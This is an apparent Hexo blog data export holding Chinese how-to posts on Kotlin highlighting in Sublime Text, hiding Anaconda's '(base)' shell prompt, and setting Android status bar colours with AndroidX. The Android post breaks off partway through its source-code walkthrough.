新方法（2023更新）\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/e47e4931371e44df888083cc990845f9.png)\n\n找到**Preferences**中的**Package Control**（如果没有这个选项，说明没有安装这个组件，在**Tools**中找到最后一个**Install Package Control**即可，稍等几分钟就会弹窗提示成功）。\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/ec9c2f41d64c4086b33d93bf2d585ca1.png)\n\n打开Package Control后在弹窗中找到Install Package这项，双击或者回车均可，等待几秒就会弹出新的窗口，直接搜索Kotlin关键词，选中第一个，安装即可。\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/590bc3f28c6b4bbaa59b82f925e8bb26.png)\n\n#### 旧方法（package下载链接已失效）\n\n[GitHub - vkostyukov/kotlin-sublime-package: Sublime Text 2 Package for Kotlin Programming Language](https://github.com/vkostyukov/kotlin-sublime-package) ，我们查看项目的README，直接下载第一个 `Kotlin.sublime-package` 。\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20210619185623671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n下载下来发现文件名字是Kotlin.zip，没关系，直接改成Kotlin.sublime-package就行了。然后我们将此文件放到应用安装目录下面的**Packages**文件夹中，Windows可能是Data/Packages之类的目录，层级不多，稍微找一下就行，这个目录下面都是统一后缀的文件。\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20210619185613400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\nmacOS在应用程序中找到Sublime Text然后右键**显示包内容**就能找到了。最后再重启Sublime Text，右下角就可以选择Kotlin语言高亮了。\n","source":"_posts/2021-06-18-快速实现Sublime Text的Kotlin高亮.md","raw":"---\nlayout:     post\ntitle:      快速实现Sublime Text的Kotlin高亮\nsubtitle:   又闲下来了。\ndate:       2021-06-18\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Kotlin\n    - 鼓捣折腾\n---\n\n### 问题\n\nSublime Text是一款非常实用的编辑器软件，偶尔不想开大型IDE的时候，用它来看看代码还是不错的。\n\n不过发现在用它来查看Kotlin代码时，默认是一片白，没有语言对应的高亮，点击右下角选择语言时也没有Kotlin这个选项（下图是解决问题之后的）。\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20210619185555397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n### 解决\n\n没有高亮看着多不舒服啊，如何快速搞定呢？已经有开源项目帮我们解决了。\n\n#### 新方法（2023更新）\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/e47e4931371e44df888083cc990845f9.png)\n\n找到**Preferences**中的**Package Control**（如果没有这个选项，说明没有安装这个组件，在**Tools**中找到最后一个**Install Package Control**即可，稍等几分钟就会弹窗提示成功）。\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/ec9c2f41d64c4086b33d93bf2d585ca1.png)\n\n打开Package Control后在弹窗中找到Install Package这项，双击或者回车均可，等待几秒就会弹出新的窗口，直接搜索Kotlin关键词，选中第一个，安装即可。\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/590bc3f28c6b4bbaa59b82f925e8bb26.png)\n\n#### 旧方法（package下载链接已失效）\n\n[GitHub - vkostyukov/kotlin-sublime-package: Sublime Text 2 Package for Kotlin Programming Language](https://github.com/vkostyukov/kotlin-sublime-package) ，我们查看项目的README，直接下载第一个 `Kotlin.sublime-package` 。\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20210619185623671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n下载下来发现文件名字是Kotlin.zip，没关系，直接改成Kotlin.sublime-package就行了。然后我们将此文件放到应用安装目录下面的**Packages**文件夹中，Windows可能是Data/Packages之类的目录，层级不多，稍微找一下就行，这个目录下面都是统一后缀的文件。\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20210619185613400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\nmacOS在应用程序中找到Sublime Text然后右键**显示包内容**就能找到了。最后再重启Sublime Text，右下角就可以选择Kotlin语言高亮了。\n","slug":"快速实现Sublime Text的Kotlin高亮","published":1,"updated":"2024-03-25T07:31:25.984Z","comments":1,"photos":[],"link":"","_id":"cluaufh1d003xthe6cygpdw60","content":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>Sublime Text是一款非常实用的编辑器软件，偶尔不想开大型IDE的时候，用它来看看代码还是不错的。</p>\n<p>不过发现在用它来查看Kotlin代码时，默认是一片白，没有语言对应的高亮，点击右下角选择语言时也没有Kotlin这个选项（下图是解决问题之后的）。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20210619185555397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>没有高亮看着多不舒服啊，如何快速搞定呢？已经有开源项目帮我们解决了。</p>\n<h4 id=\"新方法（2023更新）\"><a href=\"#新方法（2023更新）\" class=\"headerlink\" title=\"新方法（2023更新）\"></a>新方法（2023更新）</h4><p><img src=\"https://imgconvert.csdnimg.cn/e47e4931371e44df888083cc990845f9.png\" alt=\"在这里插入图片描述\"></p>\n<p>找到<strong>Preferences</strong>中的<strong>Package Control</strong>（如果没有这个选项，说明没有安装这个组件，在<strong>Tools</strong>中找到最后一个<strong>Install Package Control</strong>即可，稍等几分钟就会弹窗提示成功）。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/ec9c2f41d64c4086b33d93bf2d585ca1.png\" alt=\"在这里插入图片描述\"></p>\n<p>打开Package Control后在弹窗中找到Install Package这项，双击或者回车均可，等待几秒就会弹出新的窗口，直接搜索Kotlin关键词，选中第一个，安装即可。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/590bc3f28c6b4bbaa59b82f925e8bb26.png\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"旧方法（package下载链接已失效）\"><a href=\"#旧方法（package下载链接已失效）\" class=\"headerlink\" title=\"旧方法（package下载链接已失效）\"></a>旧方法（package下载链接已失效）</h4><p><a href=\"https://github.com/vkostyukov/kotlin-sublime-package\">GitHub - vkostyukov&#x2F;kotlin-sublime-package: Sublime Text 2 Package for Kotlin Programming Language</a> ，我们查看项目的README，直接下载第一个 <code>Kotlin.sublime-package</code> 。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20210619185623671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>下载下来发现文件名字是Kotlin.zip，没关系，直接改成Kotlin.sublime-package就行了。然后我们将此文件放到应用安装目录下面的<strong>Packages</strong>文件夹中，Windows可能是Data&#x2F;Packages之类的目录，层级不多，稍微找一下就行，这个目录下面都是统一后缀的文件。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20210619185613400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>macOS在应用程序中找到Sublime Text然后右键<strong>显示包内容</strong>就能找到了。最后再重启Sublime Text，右下角就可以选择Kotlin语言高亮了。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>Sublime Text是一款非常实用的编辑器软件，偶尔不想开大型IDE的时候，用它来看看代码还是不错的。</p>\n<p>不过发现在用它来查看Kotlin代码时，默认是一片白，没有语言对应的高亮，点击右下角选择语言时也没有Kotlin这个选项（下图是解决问题之后的）。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20210619185555397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>没有高亮看着多不舒服啊，如何快速搞定呢？已经有开源项目帮我们解决了。</p>\n<h4 id=\"新方法（2023更新）\"><a href=\"#新方法（2023更新）\" class=\"headerlink\" title=\"新方法（2023更新）\"></a>新方法（2023更新）</h4><p><img src=\"https://imgconvert.csdnimg.cn/e47e4931371e44df888083cc990845f9.png\" alt=\"在这里插入图片描述\"></p>\n<p>找到<strong>Preferences</strong>中的<strong>Package Control</strong>（如果没有这个选项，说明没有安装这个组件，在<strong>Tools</strong>中找到最后一个<strong>Install Package Control</strong>即可，稍等几分钟就会弹窗提示成功）。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/ec9c2f41d64c4086b33d93bf2d585ca1.png\" alt=\"在这里插入图片描述\"></p>\n<p>打开Package Control后在弹窗中找到Install Package这项，双击或者回车均可，等待几秒就会弹出新的窗口，直接搜索Kotlin关键词，选中第一个，安装即可。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/590bc3f28c6b4bbaa59b82f925e8bb26.png\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"旧方法（package下载链接已失效）\"><a href=\"#旧方法（package下载链接已失效）\" class=\"headerlink\" title=\"旧方法（package下载链接已失效）\"></a>旧方法（package下载链接已失效）</h4><p><a href=\"https://github.com/vkostyukov/kotlin-sublime-package\">GitHub - vkostyukov&#x2F;kotlin-sublime-package: Sublime Text 2 Package for Kotlin Programming Language</a> ，我们查看项目的README，直接下载第一个 <code>Kotlin.sublime-package</code> 。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20210619185623671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>下载下来发现文件名字是Kotlin.zip，没关系，直接改成Kotlin.sublime-package就行了。然后我们将此文件放到应用安装目录下面的<strong>Packages</strong>文件夹中，Windows可能是Data&#x2F;Packages之类的目录，层级不多，稍微找一下就行，这个目录下面都是统一后缀的文件。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20210619185613400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>macOS在应用程序中找到Sublime Text然后右键<strong>显示包内容</strong>就能找到了。最后再重启Sublime Text，右下角就可以选择Kotlin语言高亮了。</p>\n"},{"layout":"post","title":"安装Anaconda后终端base前缀问题","subtitle":"杂七杂八。","date":"2021-08-10T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n### 问题\n\n最近想训练个小模型来用用，于是乎我在macOS安装 [Anaconda | Individual Edition](https://www.anaconda.com/products/individual#Downloads) ，选择的是图形界面安装（64-Bit Graphical Installer），整个过程很顺利，一路下一步就行了。\n\n然鹅，安装完之后，我发现我的终端命令行前缀出现了一个base，像这样：\n\n```bash\n(base) -> ~\n```\n\n这就很无语。\n\n### 原因\n\n猜测原因应该是Anaconda安装后在shell的配置文件中注入了脚本，因为我用的是zsh，所以打开 `.zshrc` 文件可见：\n\n```bash\n# >>> conda initialize >>>\n# !! Contents within this block are managed by 'conda init' !!\n__conda_setup=\"$('/Users/xxx/opt/anaconda3/bin/conda' 'shell.zsh' 'hook' 2> /dev/null)\"\nif [ $? -eq 0 ]; then\n    eval \"$__conda_setup\"\nelse\n    if [ -f \"/Users/xxx/opt/anaconda3/etc/profile.d/conda.sh\" ]; then\n        . \"/Users/xxx/opt/anaconda3/etc/profile.d/conda.sh\"\n    else\n        export PATH=\"/Users/xxx/opt/anaconda3/bin:$PATH\"\n    fi\nfi\nunset __conda_setup\n# <<< conda initialize <<<\n```\n\n但为了保证Anaconda正常使用，肯定不能把这段脚本删了。\n\n### 解决\n\n在官方文档 [Using the .condarc conda configuration file](https://conda.io/projects/conda/en/latest/user-guide/configuration/use-condarc.html#change-command-prompt-changeps1) 中发现了这么个配置：\n\n> Change command prompt (changeps1)\n> When using conda activate, change the command prompt from $PS1 to include the activated environment. The default is True.\n>\n> EXAMPLE:\n>\n> changeps1: False\n\n那么我们只需要修改 `~/.condarc` 文件即可，追加内容后如下：\n\n```bash\nchannels:\n  - defaults\nchangeps1: False\n```\n\n然后刷新一下：\n\n```bash\nsource ~/.condarc\n```\n\n**注意：**\n\n我第一次在修改时，发现没有 `.condarc` 这个文件，这就很尴尬啊！解决办法是，至少启动一次 **Anaconda-Navigator** 这个应用程序，就会生成rc配置文件了。\n","source":"_posts/2021-08-11-安装Anaconda后终端base前缀问题.md","raw":"---\nlayout:     post\ntitle:      安装Anaconda后终端base前缀问题\nsubtitle:   杂七杂八。\ndate:       2021-08-11\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - AI\n    - 问题不大\n---\n\n### 问题\n\n最近想训练个小模型来用用，于是乎我在macOS安装 [Anaconda | Individual Edition](https://www.anaconda.com/products/individual#Downloads) ，选择的是图形界面安装（64-Bit Graphical Installer），整个过程很顺利，一路下一步就行了。\n\n然鹅，安装完之后，我发现我的终端命令行前缀出现了一个base，像这样：\n\n```bash\n(base) -> ~\n```\n\n这就很无语。\n\n### 原因\n\n猜测原因应该是Anaconda安装后在shell的配置文件中注入了脚本，因为我用的是zsh，所以打开 `.zshrc` 文件可见：\n\n```bash\n# >>> conda initialize >>>\n# !! Contents within this block are managed by 'conda init' !!\n__conda_setup=\"$('/Users/xxx/opt/anaconda3/bin/conda' 'shell.zsh' 'hook' 2> /dev/null)\"\nif [ $? -eq 0 ]; then\n    eval \"$__conda_setup\"\nelse\n    if [ -f \"/Users/xxx/opt/anaconda3/etc/profile.d/conda.sh\" ]; then\n        . \"/Users/xxx/opt/anaconda3/etc/profile.d/conda.sh\"\n    else\n        export PATH=\"/Users/xxx/opt/anaconda3/bin:$PATH\"\n    fi\nfi\nunset __conda_setup\n# <<< conda initialize <<<\n```\n\n但为了保证Anaconda正常使用，肯定不能把这段脚本删了。\n\n### 解决\n\n在官方文档 [Using the .condarc conda configuration file](https://conda.io/projects/conda/en/latest/user-guide/configuration/use-condarc.html#change-command-prompt-changeps1) 中发现了这么个配置：\n\n> Change command prompt (changeps1)\n> When using conda activate, change the command prompt from $PS1 to include the activated environment. The default is True.\n>\n> EXAMPLE:\n>\n> changeps1: False\n\n那么我们只需要修改 `~/.condarc` 文件即可，追加内容后如下：\n\n```bash\nchannels:\n  - defaults\nchangeps1: False\n```\n\n然后刷新一下：\n\n```bash\nsource ~/.condarc\n```\n\n**注意：**\n\n我第一次在修改时，发现没有 `.condarc` 这个文件，这就很尴尬啊！解决办法是，至少启动一次 **Anaconda-Navigator** 这个应用程序，就会生成rc配置文件了。\n","slug":"安装Anaconda后终端base前缀问题","published":1,"updated":"2024-03-25T07:31:25.984Z","comments":1,"photos":[],"link":"","_id":"cluaufh1e003zthe66spn8gnv","content":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>最近想训练个小模型来用用，于是乎我在macOS安装 <a href=\"https://www.anaconda.com/products/individual#Downloads\">Anaconda | Individual Edition</a> ，选择的是图形界面安装（64-Bit Graphical Installer），整个过程很顺利，一路下一步就行了。</p>\n<p>然鹅，安装完之后，我发现我的终端命令行前缀出现了一个base，像这样：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(base) -&gt; ~</span><br></pre></td></tr></table></figure>\n\n<p>这就很无语。</p>\n<h3 id=\"原因\"><a href=\"#原因\" class=\"headerlink\" title=\"原因\"></a>原因</h3><p>猜测原因应该是Anaconda安装后在shell的配置文件中注入了脚本，因为我用的是zsh，所以打开 <code>.zshrc</code> 文件可见：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &gt;&gt;&gt; conda initialize &gt;&gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># !! Contents within this block are managed by &#x27;conda init&#x27; !!</span></span><br><span class=\"line\">__conda_setup=<span class=\"string\">&quot;<span class=\"subst\">$(&#x27;/Users/xxx/opt/anaconda3/bin/conda&#x27; &#x27;shell.zsh&#x27; &#x27;hook&#x27; 2&gt; /dev/null)</span>&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ $? -eq 0 ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">eval</span> <span class=\"string\">&quot;<span class=\"variable\">$__conda_setup</span>&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> [ -f <span class=\"string\">&quot;/Users/xxx/opt/anaconda3/etc/profile.d/conda.sh&quot;</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">        . <span class=\"string\">&quot;/Users/xxx/opt/anaconda3/etc/profile.d/conda.sh&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"built_in\">export</span> PATH=<span class=\"string\">&quot;/Users/xxx/opt/anaconda3/bin:<span class=\"variable\">$PATH</span>&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"built_in\">unset</span> __conda_setup</span><br><span class=\"line\"><span class=\"comment\"># &lt;&lt;&lt; conda initialize &lt;&lt;&lt;</span></span><br></pre></td></tr></table></figure>\n\n<p>但为了保证Anaconda正常使用，肯定不能把这段脚本删了。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>在官方文档 <a href=\"https://conda.io/projects/conda/en/latest/user-guide/configuration/use-condarc.html#change-command-prompt-changeps1\">Using the .condarc conda configuration file</a> 中发现了这么个配置：</p>\n<blockquote>\n<p>Change command prompt (changeps1)<br>When using conda activate, change the command prompt from $PS1 to include the activated environment. The default is True.</p>\n<p>EXAMPLE:</p>\n<p>changeps1: False</p>\n</blockquote>\n<p>那么我们只需要修改 <code>~/.condarc</code> 文件即可，追加内容后如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">channels:</span><br><span class=\"line\">  - defaults</span><br><span class=\"line\">changeps1: False</span><br></pre></td></tr></table></figure>\n\n<p>然后刷新一下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> ~/.condarc</span><br></pre></td></tr></table></figure>\n\n<p><strong>注意：</strong></p>\n<p>我第一次在修改时，发现没有 <code>.condarc</code> 这个文件，这就很尴尬啊！解决办法是，至少启动一次 <strong>Anaconda-Navigator</strong> 这个应用程序，就会生成rc配置文件了。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>最近想训练个小模型来用用，于是乎我在macOS安装 <a href=\"https://www.anaconda.com/products/individual#Downloads\">Anaconda | Individual Edition</a> ，选择的是图形界面安装（64-Bit Graphical Installer），整个过程很顺利，一路下一步就行了。</p>\n<p>然鹅，安装完之后，我发现我的终端命令行前缀出现了一个base，像这样：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(base) -&gt; ~</span><br></pre></td></tr></table></figure>\n\n<p>这就很无语。</p>\n<h3 id=\"原因\"><a href=\"#原因\" class=\"headerlink\" title=\"原因\"></a>原因</h3><p>猜测原因应该是Anaconda安装后在shell的配置文件中注入了脚本，因为我用的是zsh，所以打开 <code>.zshrc</code> 文件可见：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &gt;&gt;&gt; conda initialize &gt;&gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># !! Contents within this block are managed by &#x27;conda init&#x27; !!</span></span><br><span class=\"line\">__conda_setup=<span class=\"string\">&quot;<span class=\"subst\">$(&#x27;/Users/xxx/opt/anaconda3/bin/conda&#x27; &#x27;shell.zsh&#x27; &#x27;hook&#x27; 2&gt; /dev/null)</span>&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ $? -eq 0 ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">eval</span> <span class=\"string\">&quot;<span class=\"variable\">$__conda_setup</span>&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> [ -f <span class=\"string\">&quot;/Users/xxx/opt/anaconda3/etc/profile.d/conda.sh&quot;</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">        . <span class=\"string\">&quot;/Users/xxx/opt/anaconda3/etc/profile.d/conda.sh&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"built_in\">export</span> PATH=<span class=\"string\">&quot;/Users/xxx/opt/anaconda3/bin:<span class=\"variable\">$PATH</span>&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"built_in\">unset</span> __conda_setup</span><br><span class=\"line\"><span class=\"comment\"># &lt;&lt;&lt; conda initialize &lt;&lt;&lt;</span></span><br></pre></td></tr></table></figure>\n\n<p>但为了保证Anaconda正常使用，肯定不能把这段脚本删了。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>在官方文档 <a href=\"https://conda.io/projects/conda/en/latest/user-guide/configuration/use-condarc.html#change-command-prompt-changeps1\">Using the .condarc conda configuration file</a> 中发现了这么个配置：</p>\n<blockquote>\n<p>Change command prompt (changeps1)<br>When using conda activate, change the command prompt from $PS1 to include the activated environment. The default is True.</p>\n<p>EXAMPLE:</p>\n<p>changeps1: False</p>\n</blockquote>\n<p>那么我们只需要修改 <code>~/.condarc</code> 文件即可，追加内容后如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">channels:</span><br><span class=\"line\">  - defaults</span><br><span class=\"line\">changeps1: False</span><br></pre></td></tr></table></figure>\n\n<p>然后刷新一下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> ~/.condarc</span><br></pre></td></tr></table></figure>\n\n<p><strong>注意：</strong></p>\n<p>我第一次在修改时，发现没有 <code>.condarc</code> 这个文件，这就很尴尬啊！解决办法是，至少启动一次 <strong>Anaconda-Navigator</strong> 这个应用程序，就会生成rc配置文件了。</p>\n"},{"layout":"post","title":"最简单改变状态栏文字及背景颜色的方法","subtitle":"不要再吃老本了。","date":"2021-08-21T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n## 问题\n\n我们知道，Android的状态栏（StatusBar）是可以由开发者自行更改背景颜色的，至于文字颜色，不能直接由自己修改色值，而是黑白两种颜色，对应的是Light和Dark两种全局主题模式。\n\n为了良好的用户体验，我们在状态栏背景为深色时，需要给予白色字体，反之亦然。比如这样：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/ae05b151af1e41deb2403fc0ad3a430b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n然而，有些时候我们在Light Mode下并不需要黑色字体，就需要自己手动修改了。\n\n## 方法\n\n以前我们修改状态栏相关的内容，都是去找各种反射代码，或者各种封装好的StatusBarUtil之类的，不仅代码不优雅，还容易出现千奇百怪的兼容性问题，不利于维护。\n\n如今，谷歌官方已经给出了解决方案，一切尽在AndroidX。直接看代码：\n\n```java\nimport androidx.core.view.ViewCompat;\nimport androidx.core.view.WindowInsetsControllerCompat;\n\npublic class MainActivity extends BaseActivity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        // 修改状态栏字体颜色，用AndroidX官方兼容API\n        WindowInsetsControllerCompat wic = ViewCompat.getWindowInsetsController(getWindow().getDecorView());\n        if (wic != null) {\n            // true表示Light Mode，状态栏字体呈黑色，反之呈白色\n            wic.setAppearanceLightStatusBars(false);\n        }\n\n        // 修改状态栏背景颜色，还是通用API，这个比较简单\n        getWindow().setStatusBarColor(...);\n    }\n}\n```\n\n引申一下，包括修改底部导航栏，都是类似的：\n\n```java\n// 修改导航栏按钮颜色\nwic.setAppearanceLightNavigationBars(false);\n// 修改导航栏背景色\ngetWindow().setNavigationBarColor();\n```\n\n## 其他\n\n要使用 `WindowInsetsControllerCompat` 这个类，只需要引入 `androidx.core` 即可，版本号随意，按最新的来。\n\n但如果你已经依赖了 `androidx.appcompat` 或 `com.google.android.material` ，就不需要单独引入core了，因为前两者已经包含了core：\n\n```groovy\ndependencies {\n    // 直接依赖\n    implementation \"androidx.core:core:1.5.0\"\n    // 间接依赖\n    implementation \"androidx.appcompat:appcompat:1.3.1\"\n    // or\n    implementation \"com.google.android.material:material:1.4.0\"\n}\n```\n\n其实我们感兴趣也可以简单看看源码。首先会根据不同的系统版本号返回对应的实现：\n\n```java\n@Nullable\npublic static WindowInsetsControllerCompat getWindowInsetsController(@NonNull View view) {\n    if (Build.VERSION.SDK_INT >= 30) {\n        return ViewCompat.Api30Impl.getWindowInsetsController(view);\n    } else {\n        Context context = view.getContext();\n        while (context instanceof ContextWrapper) {\n            if (context instanceof Activity) {\n                Window window = ((Activity) context).getWindow();\n                return window != null ? WindowCompat.getInsetsController(window, view) : null;\n            }\n            context = ((ContextWrapper) context).getBaseContext();\n        }\n        return null;\n    }\n}\n```\n\n然后再根据对应的版本调用相应的实现接口：\n\n```java\nprivate static class Impl {\n    Impl() {\n        